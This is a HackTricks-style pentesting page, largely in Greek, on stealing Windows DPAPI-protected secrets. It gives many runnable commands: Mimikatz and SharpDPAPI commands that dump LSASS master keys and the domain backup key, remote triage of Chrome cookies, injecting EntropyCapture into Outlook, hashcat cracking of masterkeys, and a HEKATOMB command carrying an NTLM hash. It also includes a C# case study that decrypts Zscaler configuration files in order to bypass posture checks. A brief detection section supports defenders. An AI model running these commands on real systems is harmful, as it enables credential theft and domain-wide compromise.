# DPAPI - Εξαγωγή Κωδικών Πρόσβασης

{{#include ../../banners/hacktricks-training.md}}



## Τι είναι το DPAPI

The Data Protection API (DPAPI) χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για την **συμμετρική κρυπτογράφηση ασυμμετρικών ιδιωτικών κλειδιών**, αξιοποιώντας είτε μυστικά χρήστη είτε μυστικά συστήματος ως σημαντική πηγή εντροπίας. Αυτή η προσέγγιση απλοποιεί την κρυπτογράφηση για τους προγραμματιστές, επιτρέποντάς τους να κρυπτογραφούν δεδομένα χρησιμοποιώντας ένα κλειδί που προέρχεται από τα διαπιστευτήρια σύνδεσης του χρήστη ή, για κρυπτογράφηση συστήματος, από τα μυστικά πιστοποίησης του domain του συστήματος, αποφεύγοντας έτσι την ανάγκη οι προγραμματιστές να διαχειρίζονται την προστασία του κλειδιού κρυπτογράφησης.

Ο πιο κοινός τρόπος χρήσης του DPAPI είναι μέσω των **`CryptProtectData` και `CryptUnprotectData`** συναρτήσεων, οι οποίες επιτρέπουν στις εφαρμογές να κρυπτογραφούν και να αποκρυπτογραφούν δεδομένα με ασφάλεια με τη συνεδρία της διεργασίας που είναι αυτή τη στιγμή συνδεδεμένη. Αυτό σημαίνει ότι τα κρυπτογραφημένα δεδομένα μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη ή σύστημα που τα κρυπτογράφησε.

Επιπλέον, αυτές οι συναρτήσεις δέχονται επίσης μια παράμετρο **`entropy`** η οποία θα χρησιμοποιηθεί κατά την κρυπτογράφηση και την αποκρυπτογράφηση· επομένως, για να αποκρυπτογραφήσετε κάτι που κρυπτογραφήθηκε χρησιμοποιώντας αυτή την παράμετρο, πρέπει να παρέχετε την ίδια τιμή εντροπίας που χρησιμοποιήθηκε κατά την κρυπτογράφηση.

### Δημιουργία κλειδιού χρήστη

The DPAPI δημιουργεί ένα μοναδικό κλειδί (ονομαζόμενο **`pre-key`**) για κάθε χρήστη βασισμένο στα διαπιστευτήριά του. Αυτό το κλειδί παράγεται από τον κωδικό πρόσβασης του χρήστη και άλλους παράγοντες και ο αλγόριθμος εξαρτάται από τον τύπο χρήστη αλλά τελικά καταλήγει να είναι SHA1. Για παράδειγμα, για χρήστες του domain, **εξαρτάται από το NTLM hash του χρήστη**.

Αυτό είναι ιδιαίτερα ενδιαφέρον γιατί αν ένας επιτιθέμενος μπορέσει να αποκτήσει το hash του κωδικού πρόσβασης του χρήστη, μπορεί:

- Να **αποκρυπτογραφήσει οποιαδήποτε δεδομένα είχαν κρυπτογραφηθεί χρησιμοποιώντας DPAPI** με το κλειδί αυτού του χρήστη χωρίς να χρειάζεται να απευθυνθεί σε κάποιο API
- Να προσπαθήσει να **σπάσει τον κωδικό offline** προσπαθώντας να δημιουργήσει το έγκυρο κλειδί DPAPI

Επιπλέον, κάθε φορά που κάποια δεδομένα κρυπτογραφούνται από έναν χρήστη χρησιμοποιώντας DPAPI, δημιουργείται ένα νέο master key. Αυτό το master key είναι το οποίο χρησιμοποιείται πραγματικά για την κρυπτογράφηση των δεδομένων. Σε κάθε master key αποδίδεται ένα GUID (Globally Unique Identifier) που το ταυτοποιεί.

Τα master keys αποθηκεύονται στον φάκελο **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, όπου {SID} είναι ο Security Identifier αυτού του χρήστη. Το master key αποθηκεύεται κρυπτογραφημένο από το **`pre-key`** του χρήστη και επίσης από ένα **domain backup key** για ανάκτηση (οπότε το ίδιο κλειδί αποθηκεύεται κρυπτογραφημένο 2 φορές με 2 διαφορετικούς τρόπους).

Σημειώστε ότι το domain key που χρησιμοποιείται για την κρυπτογράφηση του master key βρίσκεται στους domain controllers και δεν αλλάζει ποτέ, οπότε αν ένας επιτιθέμενος έχει πρόσβαση στον domain controller, μπορεί να ανακτήσει το domain backup key και να αποκρυπτογραφήσει τα master keys όλων των χρηστών στο domain.

Τα κρυπτογραφημένα blobs περιέχουν το GUID του master key που χρησιμοποιήθηκε για την κρυπτογράφηση των δεδομένων μέσα στις κεφαλίδες τους.

> [!TIP]
> Τα κρυπτογραφημένα blobs του DPAPI ξεκινούν με **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Δημιουργία κλειδιού μηχανής/συστήματος

This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Επιλογές εξαγωγής Master key

- Εάν ο χρήστης έχει δικαιώματα domain admin, μπορεί να αποκτήσει πρόσβαση στο **domain backup key** για να αποκρυπτογραφήσει όλα τα user master keys στον domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Με τοπικά δικαιώματα διαχειριστή, είναι δυνατό να **αποκτήσετε πρόσβαση στη μνήμη του LSASS** για να εξάγετε τα DPAPI master keys όλων των συνδεδεμένων χρηστών και το κλειδί SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Εάν ο χρήστης έχει τοπικά δικαιώματα διαχειριστή, μπορεί να αποκτήσει πρόσβαση στο **DPAPI_SYSTEM LSA secret** για να αποκρυπτογραφήσει τα machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Αν το password ή το hash NTLM του χρήστη είναι γνωστό, μπορείτε να **αποκρυπτογραφήσετε απευθείας τα master keys του χρήστη**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Εάν βρίσκεστε σε session ως χρήστης, είναι δυνατό να ζητήσετε από τον DC το **backup key για να αποκρυπτογραφήσετε τα master keys χρησιμοποιώντας RPC**. Αν είστε local admin και ο χρήστης είναι συνδεδεμένος, μπορείτε να **κλέψετε το session token του** για αυτό:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Λίστα Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Πρόσβαση σε DPAPI Encrypted Data

### Εντοπισμός κρυπτογραφημένων δεδομένων DPAPI

Τα κοινά **προστατευμένα αρχεία** χρηστών βρίσκονται σε:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Ελέγξτε επίσης να αλλάξετε το `\Roaming\` σε `\Local\` στα παραπάνω μονοπάτια.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) μπορεί να εντοπίσει κρυπτογραφημένα blobs DPAPI στο file system, registry και σε B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Σημειώστε ότι [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (από το ίδιο αποθετήριο) μπορεί να χρησιμοποιηθεί για να αποκρυπτογραφήσει, χρησιμοποιώντας το DPAPI, ευαίσθητα δεδομένα όπως cookies.

### Κλειδιά πρόσβασης και δεδομένα

- **Χρησιμοποιήστε SharpDPAPI** για να εξάγετε credentials από αρχεία κρυπτογραφημένα με DPAPI στην τρέχουσα συνεδρία:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Λήψη πληροφοριών credentials** όπως τα encrypted data και το guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Πρόσβαση masterkeys**:

Αποκρυπτογραφήστε ένα masterkey χρήστη που ζητάει το **domain backup key** μέσω RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτά τα επιχειρήματα για masterkey decryption (σημείωσε πώς είναι δυνατό να χρησιμοποιήσεις `/rpc` για να πάρεις το domains backup key, `/password` για να χρησιμοποιήσεις ένα plaintext password, ή `/pvk` για να καθορίσεις ένα DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Αποκρυπτογραφήστε δεδομένα χρησιμοποιώντας masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Το εργαλείο **SharpDPAPI** υποστηρίζει επίσης αυτές τις παραμέτρους για την αποκρυπτογράφηση του `credentials|vaults|rdg|keepass|triage|blob|ps` (σημειώστε πώς είναι δυνατό να χρησιμοποιήσετε `/rpc` για να πάρετε το domains backup key, `/password` για να χρησιμοποιήσετε ένα plaintext password, `/pvk` για να καθορίσετε ένα DPAPI domain private key file, `/unprotect` για να χρησιμοποιήσετε την τρέχουσα συνεδρία του χρήστη...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Αποκρυπτογραφήστε κάποια δεδομένα χρησιμοποιώντας τη **τρέχουσα συνεδρία χρήστη**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Διαχείριση Προαιρετικού entropy ("Third-party entropy")

Ορισμένες εφαρμογές περνούν μια πρόσθετη τιμή **entropy** στο `CryptProtectData`. Χωρίς αυτή την τιμή το blob δεν μπορεί να αποκρυπτογραφηθεί, ακόμη κι αν είναι γνωστό το σωστό masterkey. Συνεπώς, η απόκτηση του entropy είναι απαραίτητη όταν στοχεύουμε διαπιστευτήρια που προστατεύονται με αυτόν τον τρόπο (π.χ. Microsoft Outlook, κάποιοι VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) είναι ένα user-mode DLL που hooks τις DPAPI functions μέσα στη στοχευόμενη διεργασία και καταγράφει διαφανώς οποιοδήποτε προαιρετικό entropy που παρέχεται. Η εκτέλεση του EntropyCapture σε κατάσταση **DLL-injection** εναντίον διεργασιών όπως `outlook.exe` ή `vpnclient.exe` θα παράγει ένα αρχείο που αντιστοιχίζει κάθε entropy buffer στη διεργασία που το κάλεσε και στο blob. Το καταγεγραμμένο entropy μπορεί αργότερα να παρασχεθεί στο **SharpDPAPI** (`/entropy:`) ή στο **Mimikatz** (`/entropy:<file>`) προκειμένου να αποκρυπτογραφηθούν τα δεδομένα.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft εισήγαγε μια μορφή **context 3** masterkey ξεκινώντας με τα Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) πρόσθεσε hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) και **22102** (context 3), επιτρέποντας GPU-accelerated cracking των κωδικών χρηστών απευθείας από το αρχείο masterkey. Συνεπώς οι επιτιθέμενοι μπορούν να εκτελέσουν word-list ή brute-force attacks χωρίς αλληλεπίδραση με το target system.

`DPAPISnoop` (2024) αυτοματοποιεί τη διαδικασία:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Το εργαλείο μπορεί επίσης να αναλύσει τα Credential και Vault blobs, να τα αποκρυπτογραφήσει με cracked keys και να εξάγει cleartext passwords.

### Πρόσβαση σε δεδομένα άλλου μηχανήματος

Στα **SharpDPAPI and SharpChrome** μπορείτε να υποδείξετε την επιλογή **`/server:HOST`** για να αποκτήσετε πρόσβαση στα δεδομένα μιας απομακρυσμένης μηχανής. Φυσικά πρέπει να έχετε πρόσβαση σε αυτή τη μηχανή και στο ακόλουθο παράδειγμα υποτίθεται ότι το **domain backup encryption key είναι γνωστό**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Άλλα εργαλεία

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) είναι ένα εργαλείο που αυτοματοποιεί την εξαγωγή όλων των χρηστών και υπολογιστών από τον LDAP directory και την εξαγωγή του domain controller backup key μέσω RPC. Το script στη συνέχεια θα επιλύσει όλες τις IP διευθύνσεις των υπολογιστών και θα εκτελέσει smbclient σε όλους τους υπολογιστές για να ανακτήσει όλα τα DPAPI blobs όλων των χρηστών και να αποκρυπτογραφήσει τα πάντα με το domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Με τη λίστα υπολογιστών εξαγόμενη από το LDAP μπορείτε να βρείτε κάθε υποδίκτυο ακόμη και αν δεν τα γνωρίζατε!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) μπορεί αυτόματα να dumpάρει μυστικά προστατευμένα από DPAPI. Η έκδοση 2.x εισήγαγε:

* Παράλληλη συλλογή blobs από εκατοντάδες hosts
* Ανάλυση των **context 3** masterkeys και αυτόματη ενσωμάτωση cracking με Hashcat
* Υποστήριξη για Chrome "App-Bound" encrypted cookies (βλέπε επόμενη ενότητα)
* Νέα λειτουργία **`--snapshot`** για επαναλαμβανόμενη polling των endpoints και diff των νεοδημιουργημένων blobs

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) είναι ένας C# parser για masterkey/credential/vault αρχεία που μπορεί να εξάγει μορφές για Hashcat/JtR και προαιρετικά να καλεί το cracking αυτόματα. Υποστηρίζει πλήρως τα machine και user masterkey formats μέχρι και Windows 11 24H1.


## Συνηθισμένες ανιχνεύσεις

- Πρόσβαση σε αρχεία στο `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` και σε άλλους DPAPI-related φακέλους.
- Ειδικά από network share όπως **C$** ή **ADMIN$**.
- Χρήση των **Mimikatz**, **SharpDPAPI** ή παρόμοιων εργαλείων για πρόσβαση στη μνήμη LSASS ή dump των masterkeys.
- Event **4662**: *An operation was performed on an object* – μπορεί να συσχετιστεί με πρόσβαση στο αντικείμενο **`BCKUPKEY`**.
- Event **4673/4674** όταν μια διεργασία ζητάει *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 ευπάθειες & αλλαγές στο οικοσύστημα

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ένας επιτιθέμενος με δικτυακή πρόσβαση μπορούσε να ξεγελάσει ένα domain member ώστε να ανακτήσει ένα κακόβουλο DPAPI backup key, επιτρέποντας την αποκρυπτογράφηση των user masterkeys. Διορθώθηκε στο November 2023 cumulative update – οι διαχειριστές θα πρέπει να βεβαιωθούν ότι οι DCs και τα workstations είναι πλήρως patched.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) αντικατέστησε την παλιά προστασία που βασιζόταν μόνο σε DPAPI με ένα επιπλέον κλειδί αποθηκευμένο στο user’s **Credential Manager**. Η offline αποκρυπτογράφηση των cookies τώρα απαιτεί τόσο το DPAPI masterkey όσο και το **GCM-wrapped app-bound key**. Το SharpChrome v2.3 και το DonPAPI 2.x μπορούν να ανακτήσουν το επιπλέον κλειδί όταν εκτελούνται με user context.


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector αποθηκεύει αρκετά configuration αρχεία κάτω από `C:\ProgramData\Zscaler` (π.χ. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Κάθε αρχείο κρυπτογραφείται με **DPAPI (Machine scope)** αλλά ο vendor παρέχει **προσαρμοσμένη εντροπία** η οποία *υπολογίζεται κατά το runtime* αντί να αποθηκεύεται στο δίσκο.

Η εντροπία ανασυντίθεται από δύο στοιχεία:

1. Ένα hard-coded secret ενσωματωμένο μέσα στο `ZSACredentialProvider.dll`.
2. Το **SID** του Windows account στο οποίο ανήκει η ρύθμιση.

Ο αλγόριθμος που υλοποιείται από το DLL είναι ισοδύναμος με:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Επειδή το μυστικό είναι ενσωματωμένο σε ένα DLL που μπορεί να διαβαστεί από τον δίσκο, **οποιοσδήποτε τοπικός επιτιθέμενος με δικαιώματα SYSTEM μπορεί να αναδημιουργήσει την entropy για οποιοδήποτε SID** και να αποκρυπτογραφήσει τα blobs εκτός σύνδεσης:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Η αποκρυπτογράφηση αποδίδει την πλήρη JSON διαμόρφωση, συμπεριλαμβανομένου κάθε **device posture check** και της αναμενόμενης τιμής του – πληροφορία που είναι πολύτιμη όταν επιχειρούνται client-side bypasses.

> ΣΥΜΒΟΥΛΗ: τα άλλα κρυπτογραφημένα artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) προστατεύονται με DPAPI **χωρίς** entropy (`16` zero bytes). Συνεπώς μπορούν να αποκρυπτογραφηθούν απευθείας με `ProtectedData.Unprotect` μόλις αποκτηθούν προνόμια SYSTEM.

## Αναφορές

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
